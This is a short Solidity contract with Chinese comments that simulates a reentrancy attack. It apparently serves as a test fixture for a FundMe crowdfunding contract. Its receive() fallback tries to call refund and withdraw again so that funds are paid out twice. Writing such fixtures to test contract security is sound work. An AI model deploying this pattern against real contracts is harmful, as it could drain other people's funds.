// ReentrantAttacker.sol - 模拟重入攻击的合约
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IFundMe {
    function donate(address token, uint amount) external payable;

    function refund(address token) external;

    function withdraw(address token) external;

    function transferOwnership(address newOwner) external;
}

contract ReentrantAttacker {
    IFundMe public fundMe;
    bool private reentered = false;

    constructor(address fundMeAddress) {
        fundMe = IFundMe(fundMeAddress);
    }

    // 函数：通过该合约向FundMe捐款ETH
    function donate() external payable {
        fundMe.donate{value: msg.value}(address(0), 0);
    }

    // 函数：发起退款攻击（调用FundMe.refund）
    function refundAttack() external {
        fundMe.refund(address(0));
    }

    // 函数：发起提款攻击（调用FundMe.withdraw），需要先成为FundMe的owner
    function withdrawAttack() external {
        fundMe.withdraw(address(0));
    }

    // 当攻击合约收到ETH时，将尝试再次调用FundMe的函数来重入
    receive() external payable {
        if (!reentered) {
            reentered = true;
            // 根据当前FundMe状态尝试调用相应函数重入
            // 如果在退款过程中收到ETH（campaign失败状态），尝试再refund
            // 如果在提款过程中收到ETH（campaign成功状态），尝试再withdraw
            // 调用用try/catch捕获，以免fallback自身revert
            try fundMe.refund(address(0)) {} catch {}
            try fundMe.withdraw(address(0)) {} catch {}
        }
    }
}
